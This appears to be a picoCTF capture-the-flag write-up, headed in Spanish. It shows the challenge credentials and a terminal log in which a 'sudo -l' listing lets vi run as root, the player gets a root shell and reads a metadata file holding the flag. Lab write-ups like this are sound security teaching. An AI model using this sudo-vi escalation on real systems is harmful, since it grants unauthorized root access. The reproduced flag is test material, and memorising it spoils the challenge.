## Objetivo
Can you read files in the root file?
The system admin has provisioned an account for you on the main server:`ssh -p 53076 picoplayer@saturn.picoctf.net`Password: `e3pn6lmvHt`Can you login and read the root file?
## Solucion

```bash
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi test
root@challenge:/# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
root@challenge:/# cd challenge/
root@challenge:/challenge# ls
metadata.json
root@challenge:/challenge# cat metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_f6ad392b}", "username": "picoplayer", "password": "e3pn6lmvHt"}root@challenge:/challenge# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.

┌──(wil㉿DESKTOP-FKOIV4I)-[/tmp/tmp.g0ZHIeDEng]
└─$
```
## Notas adicionales
## Referencias